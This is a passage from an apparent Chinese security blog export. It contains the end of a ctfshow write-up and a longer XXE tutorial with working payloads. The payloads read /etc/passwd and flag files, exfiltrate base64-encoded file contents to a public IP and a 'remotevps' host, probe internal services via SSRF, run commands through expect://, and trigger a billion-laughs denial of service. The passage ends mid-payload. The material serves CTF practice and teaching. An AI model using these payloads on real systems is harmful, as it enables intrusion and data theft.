class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'app.py\n'</span><span class="token operator">>></span><span class="token operator">></span> os.popen<span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'app\nbin\ndev\netc\nflag\nhome\nlib\nmedia\nmnt\nopt\nproc\nroot\nrun  >>> os.popen('</span><span class="token function">tac</span> /fl*<span class="token string">').read()'</span>ctfshow<span class="token punctuation">&#123;</span>fc9e96b7-d1a8-43d8-aeca-e71ed40e482d<span class="token punctuation">&#125;</span><span class="token punctuation">\</span>n'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE</title>
      <link href="/2022/09/12/xxe/"/>
      <url>/2022/09/12/xxe/</url>
      
        <content type="html"><![CDATA[<h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><h2 id="xml基础知识"><a href="#xml基础知识" class="headerlink" title="xml基础知识"></a>xml基础知识</h2><p> XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。 </p><blockquote><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</p></blockquote><p><img src="/images/1205477-20170729131727597-973576085.png" alt="img"></p><h3 id="xml文档的构建模块"><a href="#xml文档的构建模块" class="headerlink" title="xml文档的构建模块"></a>xml文档的构建模块</h3><p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p><ul><li>元素</li><li>属性</li><li>实体</li><li>PCDATA</li><li>CDATA</li></ul><p>下面是每个构建模块的简要描述。</p><p>1，元素<br>元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。<br>实例:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>body text in between<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span>some message in between<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>空的 HTML 元素的例子是 “hr”、”br” 以及 “img”。</p><p>2，属性<br>属性可提供有关元素的额外信息<br>实例：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>computer.gif<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3，实体<br>实体是用来<strong>定义普通文本的变量</strong>。<strong>实体引用是对实体的引用</strong>。</p><p>4，PCDATA<br>PCDATA 的意思是<strong>被解析的字符数据</strong>（parsed character data）。<br>PCDATA 是会<strong>被解析器解析的文本</strong>。这些文本将被解析器检查实体以及标记。</p><p>5，CDATA<br>CDATA 的意思是<strong>字符数据</strong>（character data）。<br>CDATA 是<strong>不会被解析器解析的文本</strong>。</p><h3 id="DTD-文档类型定义"><a href="#DTD-文档类型定义" class="headerlink" title="DTD(文档类型定义)"></a>DTD(文档类型定义)</h3><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。</p><p>DTD <strong>可以在 XML 文档内声明</strong>，也可以<strong>外部引用</strong>。</p><p>1，内部声明： ex: <code> &lt;!DOCTYPE 根元素 [元素声明]&gt;  &lt;!DOCTYOE test any&gt;</code><br>完整实例：</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [  &lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!ELEMENT to      (#PCDATA)&gt;  &lt;!ELEMENT from    (#PCDATA)&gt;  &lt;!ELEMENT heading (#PCDATA)&gt;  &lt;!ELEMENT body    (#PCDATA)&gt;]&gt;&lt;note&gt;  &lt;to&gt;George&lt;&#x2F;to&gt;  &lt;from&gt;John&lt;&#x2F;from&gt;  &lt;heading&gt;Reminder&lt;&#x2F;heading&gt;  &lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;&lt;&#x2F;note&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2，外部声明（引用外部DTD）： ex:<code>  &lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;  &lt;!DOCTYPE test SYSTEM &#39;http://www.test.com/evil.dtd&#39;&gt;</code><br>完整实例:</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;&lt;note&gt;&lt;to&gt;George&lt;&#x2F;to&gt;&lt;from&gt;John&lt;&#x2F;from&gt;&lt;heading&gt;Reminder&lt;&#x2F;heading&gt;&lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;&lt;&#x2F;note&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而note.dtd的内容为:</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>DTD的作用：</p><ul><li>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。</li><li>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</li><li>您的应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。</li><li>您还可以使用 DTD 来验证您自身的数据。</li></ul><h3 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h3><p>DTD实体是<strong>用于定义引用普通文本</strong>或<strong>特殊字符的快捷方式</strong>的变量，可以<strong>内部声明或外部引用</strong>。</p><p> 实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。 </p><h5 id="实体类别"><a href="#实体类别" class="headerlink" title="实体类别"></a>实体类别</h5><p>实体按类型主要分为以下四种：</p><ul><li>内置实体 (Built-in entities)</li><li>字符实体 (Character entities)</li><li>通用实体 (General entities)</li><li>参数实体 (Parameter entities)</li></ul><p> <strong>参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&amp;实体名称。</strong> </p><p> <strong>参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。</strong> </p><hr><p>实体又分为<strong>一般实体和参数实体</strong><br>1，<strong>一般实体</strong>的声明语法:<br>引用实体的方式：**&amp;实体名<strong>；<br>2，参数实体只能在DTD中使用，参数实体的声明格式：<br>引用实体的方式：</strong>%实体名**；</p><hr><h4 id="1，内部实体声明"><a href="#1，内部实体声明" class="headerlink" title="1，内部实体声明:"></a><strong>1，内部实体声明:</strong></h4><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>完整实例:</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;]&gt;&lt;test&gt;&amp;writer;&amp;copyright;&lt;&#x2F;test&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2，外部实体声明"><a href="#2，外部实体声明" class="headerlink" title="2，外部实体声明:"></a><strong>2，外部实体声明:</strong></h4><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>完整实例:</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY writer SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt;&lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt;]&gt;&lt;author&gt;&amp;writer;&amp;copyright;&lt;&#x2F;author&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3、参数实体："><a href="#3、参数实体：" class="headerlink" title="3、参数实体："></a>3、参数实体：</h4><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;或者&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>实例演示：一般实体+内部实体</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY name &quot;nMask&quot;&gt;]&gt;&lt;foo&gt;&lt;value&gt;&amp;name;&lt;&#x2F;value&gt;&lt;&#x2F;foo&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实例演示：参数实体+外部实体</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY % name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;%name;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。</p><p>由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。<br>外部实体<br>外部实体即在DTD中使用</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">实体名称</span> <span class="token attr-name">SYSTEM</span> <span class="token attr-name">"URI"</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？<br>主要的有file、http、https、ftp等等，当然不同的程序支持的不一样：</p><p> <img src="/images/5782d6c9d75646441930bebec4b15949.png" alt="img"> </p><p>php安装扩展后还能支持的一些协议：</p><p> <img src="/images/37fa93b79ecd560e39eb16791f42899c.png" alt="img"> </p><h2 id="XXE检测"><a href="#XXE检测" class="headerlink" title="XXE检测"></a>XXE检测</h2><p> 检测所有接受XML作为输入内容端点，抓包观察其是否会返回我们想要的内容 </p><h3 id="首先检测XML是否会被成功解析："><a href="#首先检测XML是否会被成功解析：" class="headerlink" title="首先检测XML是否会被成功解析："></a>首先检测XML是否会被成功解析：</h3><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY words &quot;Hello XXE !&quot;&gt;]&gt;&lt;root&gt;&amp;words;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果数据包或页面中存在“Hello XXE”的字样，则表名实体已被解析。<br> <img src="/images/7e76219cef90b4d17fd9c331d7778bb3.png" alt="img"> </p><p> 如果数据包或页面中存在“Hello XXE”的字样，则表名实体已被解析。</p><h3 id="接下来检测该端点是否支持DTD引用外部实体："><a href="#接下来检测该端点是否支持DTD引用外部实体：" class="headerlink" title="接下来检测该端点是否支持DTD引用外部实体："></a>接下来检测该端点是否支持DTD引用外部实体：</h3><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;”1.0” encoding&#x3D;”UTF-8”?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY % name SYSTEM &quot;http:&#x2F;&#x2F;localhost&#x2F;tp5&#x2F;test.xml&quot;&gt;%name;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 通过<strong>查看自己服务器上的日志</strong>来判断，看目标服务器<strong>是否向你的服务器发了一条请求test.xml的HTTP request</strong> </p><p> <img src="/images/d2eec22d8ce3b613040797806658511c.png" alt="img"> </p><p>如果都成立则很有可能存在XXE漏洞</p><h2 id="XXE攻击"><a href="#XXE攻击" class="headerlink" title="XXE攻击"></a>XXE攻击</h2><p> 以下利用主要基于<code>libxml2</code>版本，其中<strong>libxml是PHP的xml支持</strong>。<br><strong>而libxml版本在2.9.1及以后，默认不解析外部实体，很多利用将无法实现</strong>。 </p><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//漏洞函数</span>    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">ctfshow</span><span class="token punctuation">;</span><span class="token comment">//筛选ctfshow那一项的信息</span>    <span class="token keyword">echo</span> <span class="token variable">$ctfshow</span><span class="token punctuation">;</span><span class="token comment">//只输出ctfshow那一项的信息</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ENTITY a SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;&lt;paidx0&gt;&lt;ctfshow&gt;&amp;a;&lt;&#x2F;ctfshow&gt;&lt;&#x2F;paidx0&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="文件读取（没有回显）"><a href="#文件读取（没有回显）" class="headerlink" title="文件读取（没有回显）"></a>文件读取（没有回显）</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//没有回显</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><?xml version="1.0" encoding="UTF-8"?><p>可以要也可以不要</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE  xxe [&lt;!ENTITY %25 file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag&quot;&gt;&lt;!ENTITY %25 xee SYSTEM &quot;http:&#x2F;&#x2F;175.178.196.226&#x2F;xxe.dtd&quot;&gt;%25xee;%25send;]&gt;&lt;root&gt;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：这里的%25其实应该是%,因为chrome浏览器直接用%会报错，要用%25代替</p><p>思路是：在公网服务器上建一个xxe.dtd文件</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;175.178.196.226&#x2F;xxxget.php?1&#x3D;%file;&#39;&gt;&quot;&gt;%all;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用php伪协议读取flag，再在公网服务器中建一个php文件，来接受数据，同时这里面使用了嵌套实体(不懂为什么要使用)，不用就得不到flag<img src="/images/image-20220912095339306.png" alt="image-20220912095339306"></p><p>发现用户名会显示，抓包发现以xml的形式传输</p><p><img src="/images/image-20220912095417645.png" alt="image-20220912095417645"></p><p>思路：修改username的内容，然后进行输出：</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ENTITY a SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;]&gt;&lt;binbin&gt;&lt;username&gt;&amp;a;&lt;&#x2F;username&gt;&lt;password&gt;1&lt;&#x2F;password&gt;&lt;&#x2F;binbin&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-20220912095544692.png" alt="image-20220912095544692"></p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p> XXE 可以与SSRF（服务端请求伪造） 漏洞一起用于探测其它内网主机的信息，基于http协议 </p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;internal.service&#x2F;secret_pass.txt&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;&#x2F;foo&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当然也可以用来探测端口信息，根据响应包的信息，若非“connection refused”则表示该端口可能是开放的。</p><p>众所周知，有些企业对内网的安全性可能不那么注重。除了以上的利用，控制服务器对外网发送请求也是有可能成功的。此处可使用ncat工具进行测试。关于ncat的使用：ncat-网络工具中的‘瑞士军刀’</p><p>用ncat在自己的服务器上开启监听：ncat -lvkp 8081(端口可自定义)</p><p>之后便可使用以下语句尝试是否能够建立连接：</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;  &lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;ATTACKERIP:8081&#x2F;&quot; [  &lt;!ELEMENT data (#PCDATA)&gt;  ]&gt;&lt;data&gt;4&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果能够建立连接，那么服务器端的ncat会收到相应的请求信息。</p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p> 在安装expect扩展的PHP环境里执行系统命令，当然其他协议也有可能可以执行系统命令 </p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect:&#x2F;&#x2F;id&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="DDoS"><a href="#DDoS" class="headerlink" title="DDoS"></a>DDoS</h3><p> 支持实体测试： </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?xml version<span class="token operator">=</span><span class="token string">"1.0"</span>?<span class="token operator">></span> <span class="token operator">&lt;</span>!DOCTYPE lolz <span class="token punctuation">[</span> <span class="token operator">&lt;</span>!ENTITY lol <span class="token string">"lol"</span><span class="token operator">></span> <span class="token operator">&lt;</span>!ELEMENT lolz <span class="token punctuation">(</span><span class="token comment">#PCDATA)> &lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"> &lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"> &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;">...... &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;">]>&lt;lolz>&amp;lol9;&lt;/lolz></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="带外"><a href="#带外" class="headerlink" title="带外"></a>带外</h3><p>带外数据通道的建立是使用嵌套形式，利用外部实体中的URL发出访问，从而跟攻击者的服务器发生联系。但有些情况下不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。</p><p>将嵌套的实体声明放入到一个外部文件中，这里一般是放在攻击者的服务器上，这样做可以规避错误。</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;1.txt&quot;&gt;&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;remotevps&#x2F;evil.xml&quot;&gt;%remote;%all;]&gt;&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>evil.xml：</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;remotevps&#x2F;1.php?file&#x3D;%file;&#39;&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>实体remote，all，send的引用顺序很重要，首先对remote引用目的是将外部文件evil.xml引入到解释上下文中，然后执行%all，这时会检测到send实体，在root节点中引用send，就可以成功实现数据转发。当请求发送以后，攻击者的服务器上就能查看到1.txt中的内容。</p><p> 基于错误的XXE<br>形同blind xxe，当我们成功地让服务端解析了xml文档，得到的响应却是通用的。比如添加账号的时候只返回“添加成功”这样的响应。此时我们可以让服务器响应报错信息来得到我们要的敏感数据。</p><p>有两种报错的来源：</p><p>DTD结构的错误<br>XML架构验证时的错误<br>外部DTD</p><p>在本例中，我们将让服务器加载一个恶意DTD，它将在错误消息中显示文件的内容(只有当可以看到错误消息时，这才有效)。</p><p>可以使用恶意的外部DTD触发包含&#x2F;etc&#x2F;passwd文件内容的XML解析错误消息，如下所示:</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;%file;&#39;&gt;&quot;&gt;%eval;%error;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个DTD执行以下步骤:</p><p>定义一个名为file的XML参数实体，其中包含&#x2F;etc&#x2F;passwd文件的内容。</p><p>定义一个名为eval的XML参数实体，包含另一个名为error的XML参数实体的动态声明。<strong>错误实体将通过加载一个不存在的文件来评估，该文件的名称包含文件实体的值</strong>。</p><p>使用eval实体，该实体将导致执行错误实体的动态声明。</p><p>使用错误实体，以便通过尝试加载不存在的文件来得到数据，从而导致返回包含不存在文件的名称的错误消息，该名称正是&#x2F;etc&#x2F;passwd文件的内容。</p><p>实例演示：<br><img src="/images/008i3skNgy1gsg90v59jcj311t0a7wja.jpg" alt="img"> </p><p> 请注意，外部DTD允许我们在第二个(eval)中包含一个实体，但在内部DTD中是禁止的。因此，在不允许使用外部DTD的情况下(通常)强制执行错误是行不通的。 </p><h3 id="内外部DTD混合"><a href="#内外部DTD混合" class="headerlink" title="内外部DTD混合"></a>内外部DTD混合</h3><p>那么，当带外交互被阻止(外部连接不可用)时， blind XXE漏洞怎么办?</p><p>在这种情况下，由于XML语言规范中的漏洞，仍然有可能触发包含敏感数据的错误消息。如果文档的DTD混合使用内部和外部DTD声明，那么内部DTD可以重新定义在外部DTD中声明的实体。当发生这种情况时，在另一个参数实体的定义中使用XML参数实体的限制就放宽了。</p><p>这意味着攻击者可以从内部DTD中使用基于错误的XXE技术，前提是他们使用的XML参数实体是重新定义在外部DTD中声明的实体。当然，如果带外连接被阻塞，那么就不能从远程位置加载外部DTD。相反，它需要是应用服务器本地的外部DTD文件。从本质上说，攻击涉及调用碰巧存在于本地文件系统上的DTD文件，并将其重新用于重定义现有实体，从而触发包含敏感数据的解析错误。</p><p>例如，假设服务器文件系统上位于位置&#x2F;usr&#x2F;local&#x2F;app&#x2F;schema.上有一个DTD文件这个dtd文件定义了一个名为custom_entity的实体。攻击者可以通过提交如下混合DTD来触发包含&#x2F;etc&#x2F;passwd文件内容的XML解析错误消息:</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE foo [        &lt;!ENTITY % local_dtd SYSTEM 